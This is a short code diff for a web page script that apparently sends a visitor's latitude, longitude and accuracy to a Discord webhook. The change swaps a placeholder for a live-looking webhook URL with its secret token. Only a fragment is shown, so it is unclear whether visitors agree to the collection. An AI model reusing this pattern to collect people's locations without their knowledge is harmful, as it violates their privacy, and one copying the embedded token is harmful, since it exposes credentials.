@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const statusMsg = document.getElementById("status-message");
   const modal = document.getElementById("location-modal");
 
-  const webhookURL = "MY_WEBHOOK"; // Replace with your webhook
+  const webhookURL = "https://discord.com/api/webhooks/1383281092777480313/Zh_MyM1ljMmc0PFZMskyV8fclEkARhghn8tuvhi0knMZttDD2C__ASn3XeopZ9yyGgBd"; // Replace with your webhook
 
   function sendToDiscord(latitude, longitude, accuracy, timestamp) {
     const readableTime = new Date(timestamp).toLocaleString();
